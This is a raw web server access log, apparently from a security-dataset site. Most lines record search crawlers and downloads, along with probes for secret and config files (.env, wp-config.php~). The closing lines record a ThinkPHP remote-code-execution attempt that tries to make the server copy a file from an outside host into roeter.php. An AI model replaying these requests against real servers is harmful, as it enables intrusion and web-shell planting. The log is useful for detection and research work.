189.20.106.167 - - [28/Mar/2022:17:24:23 -0700] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
189.20.106.167 - - [28/Mar/2022:17:24:24 -0700] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
114.119.145.137 - - [28/Mar/2022:17:25:34 -0700] "GET /self.logs/access.log.2017-06-04.gz HTTP/1.1" 200 25089 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
207.46.13.153 - - [28/Mar/2022:17:37:07 -0700] "GET /self.logs/error.log.2021-07-26.gz HTTP/1.1" 200 3148 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
115.85.252.71 - - [28/Mar/2022:17:46:09 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 76160 "https://blog.csdn.net/answer3lin/article/details/82966360" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
114.119.149.228 - - [28/Mar/2022:17:47:41 -0700] "GET /self.logs/error.log.2017-06-19.gz HTTP/1.1" 200 918 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
40.77.167.0 - - [28/Mar/2022:17:54:14 -0700] "GET /self.logs/ HTTP/1.1" 200 35220 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
223.72.88.71 - - [28/Mar/2022:18:00:36 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
114.119.149.228 - - [28/Mar/2022:18:07:39 -0700] "GET /self.logs/error.log.2019-10-17.gz HTTP/1.1" 200 818 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
206.47.249.246 - - [28/Mar/2022:18:11:27 -0700] "GET /self.logs/error.log.2019-04-23.gz HTTP/1.1" 304 280 "-" "Mozilla/4.0 (compatible;)" 
112.47.58.218 - - [28/Mar/2022:18:12:02 -0700] "GET / HTTP/1.1" 200 49089 "-" "-" 
115.85.252.71 - - [28/Mar/2022:18:12:13 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 78880 "https://link.csdn.net/?target=http%3A%2F%2Fwww.secrepo.com%2Fauth.log%2Fauth.log.gz" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:12:15 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 206 458 "https://link.csdn.net/?target=http%3A%2F%2Fwww.secrepo.com%2Fauth.log%2Fauth.log.gz" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:12:16 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 206 78880 "https://link.csdn.net/?target=http%3A%2F%2Fwww.secrepo.com%2Fauth.log%2Fauth.log.gz" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:12:31 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 206 458 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:12:31 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 206 602519 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
17.121.114.217 - - [28/Mar/2022:18:13:59 -0700] "GET /self.logs/error.log.2020-02-01 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.149.23 - - [28/Mar/2022:18:14:26 -0700] "GET /self.logs/access.log.2018-11-01.gz HTTP/1.1" 200 21519 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
72.18.125.50 - - [28/Mar/2022:18:20:27 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
72.18.125.50 - - [28/Mar/2022:18:20:27 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
199.58.86.206 - - [28/Mar/2022:18:22:57 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [28/Mar/2022:18:22:58 -0700] "GET / HTTP/1.1" 200 13108 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
114.119.145.137 - - [28/Mar/2022:18:27:15 -0700] "GET /self.logs/access.log.2020-12-12.gz HTTP/1.1" 200 31075 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
115.85.252.71 - - [28/Mar/2022:18:31:30 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:31:31 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:31:31 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:31:31 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
115.85.252.71 - - [28/Mar/2022:18:31:55 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
192.99.4.168 - - [28/Mar/2022:18:32:10 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
192.99.4.168 - - [28/Mar/2022:18:32:11 -0700] "GET /self.logs/error.log.2021-07-27 HTTP/1.1" 200 1027 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
51.222.253.5 - - [28/Mar/2022:18:33:01 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
115.85.252.71 - - [28/Mar/2022:18:33:05 -0700] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 127761 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36" 
40.77.167.0 - - [28/Mar/2022:18:35:48 -0700] "GET /self.logs/ HTTP/1.1" 200 35220 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
20.120.99.243 - - [28/Mar/2022:18:37:32 -0700] "GET /.env HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" 
20.120.99.243 - - [28/Mar/2022:18:37:32 -0700] "GET /.env HTTP/1.1" 404 519 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" 
114.119.149.218 - - [28/Mar/2022:18:40:38 -0700] "GET /self.logs/2015/error.log.2015-11-29.gz HTTP/1.1" 200 723 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.140.174 - - [28/Mar/2022:18:47:24 -0700] "GET /self.logs/access.log.2018-02-13.gz HTTP/1.1" 200 38185 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.99 - - [28/Mar/2022:18:47:42 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.21.99 - - [28/Mar/2022:18:51:34 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.140.174 - - [28/Mar/2022:18:53:49 -0700] "GET /self.logs/access.log.2018-04-06.gz HTTP/1.1" 200 27200 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.99 - - [28/Mar/2022:18:55:14 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.21.99 - - [28/Mar/2022:18:58:55 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.222 - - [28/Mar/2022:18:59:51 -0700] "GET /self.logs/2015/error.log.2015-08-30.gz HTTP/1.1" 200 701 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.99 - - [28/Mar/2022:19:02:35 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.21.99 - - [28/Mar/2022:19:06:07 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.21.99 - - [28/Mar/2022:19:09:31 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
51.222.253.1 - - [28/Mar/2022:19:11:57 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/irc.html HTTP/1.1" 200 1740 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
49.7.21.99 - - [28/Mar/2022:19:14:47 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
162.241.219.161 - - [28/Mar/2022:19:15:01 -0700] "GET /wordpress/ HTTP/1.1" 301 439 "-" "-" 
162.241.219.161 - - [28/Mar/2022:19:15:02 -0700] "GET /wordpress/ HTTP/1.1" 404 284 "-" "-" 
114.119.149.237 - - [28/Mar/2022:19:15:28 -0700] "GET /self.logs/access.log.2018-08-31.gz HTTP/1.1" 200 24031 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
162.210.196.100 - - [28/Mar/2022:19:16:32 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [28/Mar/2022:19:16:32 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [28/Mar/2022:19:16:34 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [28/Mar/2022:19:16:35 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
40.77.167.0 - - [28/Mar/2022:19:18:42 -0700] "GET /self.logs/ HTTP/1.1" 200 35220 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
17.121.115.70 - - [28/Mar/2022:19:24:52 -0700] "GET /self.logs/error.log.2019-12-08 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
49.7.21.99 - - [28/Mar/2022:19:25:16 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
66.249.75.111 - - [28/Mar/2022:19:25:40 -0700] "GET /self.logs/error.log.2021-08-26 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
114.119.149.218 - - [28/Mar/2022:19:29:55 -0700] "GET /self.logs/2015/error.log.2015-12-16.gz HTTP/1.1" 200 745 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
52.212.146.96 - - [28/Mar/2022:19:30:03 -0700] "GET /self.logs/access.log.2022-03-22.gz HTTP/1.1" 200 16504 "-" "python-requests/2.12.1" 
114.119.145.137 - - [28/Mar/2022:19:36:27 -0700] "GET /self.logs/error.log.2019-11-02.gz HTTP/1.1" 200 1540 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.218 - - [28/Mar/2022:19:42:54 -0700] "GET /self.logs/access.log.2020-03-18.gz HTTP/1.1" 200 14602 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.218 - - [28/Mar/2022:19:49:30 -0700] "GET /self.logs/access.log.2017-08-17.gz HTTP/1.1" 200 21371 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.75.162 - - [28/Mar/2022:19:51:18 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.75.111 - - [28/Mar/2022:19:51:19 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
51.222.253.13 - - [28/Mar/2022:19:54:46 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/dhcp.html HTTP/1.1" 200 1696 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.149.228 - - [28/Mar/2022:19:56:16 -0700] "GET /self.logs/error.log.2020-08-31.gz HTTP/1.1" 200 932 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.21.99 - - [28/Mar/2022:19:59:16 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
40.77.167.0 - - [28/Mar/2022:20:00:46 -0700] "GET /self.logs/ HTTP/1.1" 200 35220 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.149.228 - - [28/Mar/2022:20:01:58 -0700] "GET /self.logs/access.log.2017-12-12.gz HTTP/1.1" 200 38688 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.23 - - [28/Mar/2022:20:07:13 -0700] "GET /self.logs/error.log.2017-03-07.gz HTTP/1.1" 200 1017 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
153.3.60.205 - - [28/Mar/2022:20:37:50 -0700] "GET / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
153.3.60.205 - - [28/Mar/2022:20:37:51 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
153.3.60.205 - - [28/Mar/2022:20:37:53 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
153.3.60.205 - - [28/Mar/2022:20:37:53 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
153.3.60.205 - - [28/Mar/2022:20:38:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
153.3.60.205 - - [28/Mar/2022:20:38:09 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
114.119.149.228 - - [28/Mar/2022:20:38:43 -0700] "GET /self.logs/error.log.2018-05-17.gz HTTP/1.1" 200 5330 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
40.77.167.0 - - [28/Mar/2022:20:42:00 -0700] "GET /self.logs/ HTTP/1.1" 200 35220 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.21.99 - - [28/Mar/2022:20:43:29 -0700] "GET / HTTP/1.1" 200 13147 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.222 - - [28/Mar/2022:20:57:06 -0700] "GET /self.logs/access.log.2020-11-28.gz HTTP/1.1" 200 12604 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.140.174 - - [28/Mar/2022:21:09:24 -0700] "GET /self.logs/2015/error.log.2015-12-11.gz HTTP/1.1" 200 777 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.218 - - [28/Mar/2022:21:15:30 -0700] "GET /self.logs/access.log.2019-08-04.gz HTTP/1.1" 200 20650 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
40.77.167.0 - - [28/Mar/2022:21:21:23 -0700] "GET /self.logs/ HTTP/1.1" 200 35220 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.140.174 - - [28/Mar/2022:21:21:37 -0700] "GET /self.logs/access.log.2017-05-26.gz HTTP/1.1" 200 15669 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
180.75.244.120 - - [28/Mar/2022:21:24:55 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0" 
180.75.244.120 - - [28/Mar/2022:21:24:55 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0" 
180.75.244.120 - - [28/Mar/2022:21:24:56 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0" 
180.75.244.120 - - [28/Mar/2022:21:24:56 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0" 
180.75.244.120 - - [28/Mar/2022:21:24:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0" 
180.75.244.120 - - [28/Mar/2022:21:24:56 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0" 
180.75.244.120 - - [28/Mar/2022:21:24:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0" 
49.7.21.99 - - [28/Mar/2022:21:26:48 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.145.137 - - [28/Mar/2022:21:27:39 -0700] "GET /self.logs/access.log.2020-07-06.gz HTTP/1.1" 200 16206 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
40.77.167.0 - - [28/Mar/2022:21:29:07 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.31 - - [28/Mar/2022:21:29:22 -0700] "GET /css/style.css HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
112.47.58.180 - - [28/Mar/2022:21:31:01 -0700] "HEAD / HTTP/1.1" 200 396 "http://www.SecRepo.com" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36" 
112.47.58.180 - - [28/Mar/2022:21:31:06 -0700] "HEAD / HTTP/1.1" 200 352 "https://www.baidu.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
162.241.148.253 - - [28/Mar/2022:21:32:37 -0700] "HEAD / HTTP/1.1" 200 359 "https://www.ilovephd.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
180.76.102.66 - - [28/Mar/2022:21:34:17 -0700] "GET /?feed=rss2 HTTP/1.1" 200 13186 "http://www.secrepo.com/?feed=rss2" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)" 
103.45.130.5 - - [28/Mar/2022:21:35:41 -0700] "POST //index.php HTTP/1.1" 301 493 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
103.45.130.5 - - [28/Mar/2022:21:35:43 -0700] "GET /index.php HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
103.45.130.5 - - [28/Mar/2022:21:35:45 -0700] "GET //robots.php HTTP/1.1" 301 495 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
103.45.130.5 - - [28/Mar/2022:21:35:45 -0700] "GET /robots.php HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
54.226.90.43 - - [28/Mar/2022:21:37:19 -0700] "GET /wp-config.php~ HTTP/1.1" 418 747 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" 
17.121.112.55 - - [28/Mar/2022:21:43:03 -0700] "GET /self.logs/error.log.2020-03-01 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.149.222 - - [28/Mar/2022:21:52:23 -0700] "GET /self.logs/error.log.2017-11-24.gz HTTP/1.1" 200 2334 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
103.45.130.5 - - [28/Mar/2022:21:56:09 -0700] "GET //?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 805 "-" "python-requests/2.27.1" 
103.45.130.5 - - [28/Mar/2022:21:56:13 -0700] "GET /?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13186 "-" "python-requests/2.27.1" 
103.45.130.5 - - [28/Mar/2022:21:56:14 -0700] "GET //?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 301 807 "-" "python-requests/2.27.1" 
103.45.130.5 - - [28/Mar/2022:21:56:15 -0700] "GET //roeter.php HTTP/1.1" 301 495 "-" "python-requests/2.27.1" 
103.45.130.5 - - [28/Mar/2022:21:56:17 -0700] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.27.1" 
103.45.130.5 - - [28/Mar/2022:21:56:17 -0700] "GET /?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://dp888.top/cmd.txt&vars%5B1%5D%5B%5D=roeter.php HTTP/1.1" 200 13186 "-" "python-requests/2.27.1" 
103.45.130.5 - - [28/Mar/2022:21:56:19 -0700] "GET //roeter.php HTTP/1.1" 301 495 "-" "python-requests/2.27.1" 
103.45.130.5 - - [28/Mar/2022:21:56:20 -0700] "GET /roeter.php HTTP/1.1" 404 328 "-" "python-requests/2.27.1" 
